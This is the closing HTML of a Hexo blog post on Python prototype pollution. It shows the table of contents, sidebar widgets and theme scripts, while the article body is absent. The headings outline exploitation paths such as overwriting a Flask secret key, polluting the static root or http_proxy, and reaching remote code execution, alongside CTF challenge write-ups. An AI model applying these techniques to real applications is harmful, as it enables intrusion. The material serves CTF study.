+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text"> 原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text"> 理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.</span> <span class="toc-text"> 原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text"> 获取目标类：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.</span> <span class="toc-text"> 获取全局变量：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text"> 获取其他模块:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#import%E5%8A%A0%E8%BD%BD%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.1.</span> <span class="toc-text"> import加载获取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.2.</span> <span class="toc-text"> sys模块加载获取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8loader%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.3.</span> <span class="toc-text"> 加载器loader获取：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.</span> <span class="toc-text"> 函数形参默认值替换：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.</span> <span class="toc-text"> 关键信息替换：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.1.</span> <span class="toc-text"> flask密钥替换：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E9%9D%99%E6%80%81%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">6.2.</span> <span class="toc-text"> 污染静态根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#_got_first_request"><span class="toc-number">6.3.</span> <span class="toc-text"> _got_first_request：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ospathpardir"><span class="toc-number">6.4.</span> <span class="toc-text"> os.path.pardir:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.</span> <span class="toc-text"> pydash原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%97%B6%E6%9C%BA%E4%BD%BF%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text"> 魔术方法时机使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text"> 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="toc-number">9.1.</span> <span class="toc-text"> unicode编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BE%8B%E9%A2%98"><span class="toc-number">10.</span> <span class="toc-text"> Python原型链污染例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezflaskdasctf2023%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-number">10.1.</span> <span class="toc-text"> EzFlask(DASCTF2023七月暑期挑战赛)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#geekchallenge2023ezpython"><span class="toc-number">10.2.</span> <span class="toc-text"> [GeekChallenge2023]ezpython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF2023-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8F%98%E4%BD%93"><span class="toc-number">10.3.</span> <span class="toc-text"> 安洵杯2023-原型链污染变体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-%E6%B1%A1%E6%9F%93http_proxy"><span class="toc-number">10.3.1.</span> <span class="toc-text"> 法一 污染http_proxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-%E7%9B%B4%E6%8E%A5rce"><span class="toc-number">10.3.2.</span> <span class="toc-text"> 法二 直接rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89-%E6%8E%A7%E5%88%B6%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE"><span class="toc-number">10.3.3.</span> <span class="toc-text"> 法三 控制响应数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BE%8B%E9%A2%98"><span class="toc-number">11.</span> <span class="toc-text"> Pydash原型链污染例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suctf2025su_blog"><span class="toc-number">11.1.</span> <span class="toc-text"> [SUCTF2025]SU_blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nctf-2025-ezdash_revenge"><span class="toc-number">11.2.</span> <span class="toc-text"> NCTF-2025 ezdash_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn2024sanic%E9%87%8D%E8%A6%81"><span class="toc-number">11.3.</span> <span class="toc-text"> [CISCN2024]Sanic（重要!!!）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dasctf-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9Bsanics-revenge%E6%B2%A1%E6%87%82"><span class="toc-number">11.4.</span> <span class="toc-text"> DASCTF 2024暑期挑战赛Sanic’s revenge（没懂）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">11.4.1.</span> <span class="toc-text"> 分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file_or_directory"><span class="toc-number">11.4.2.</span> <span class="toc-text"> file_or_directory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">11.4.3.</span> <span class="toc-text"> 解题</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "python原型链污染",
+          url: "http://example.com/2025/05/07/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
+          excerpt: "",
+          description: "",
+          stripContent: " 原型链 在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。 取自浅谈Python原型链污染及利用方式-先知社区  理解 __init__：一个 函数对象 __globals__：每个函数对象都有一个属性 __globals__，它指向 函数定义所在模块的全局命名空间（字典）。（包括定义的变量",
+          date: "Wed May 07 2025 09:00:25 GMT+0800",
+          updated: "Mon Dec 01 2025 19:23:51 GMT+0800",
+          cover: "/../images/1737907114de8a.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
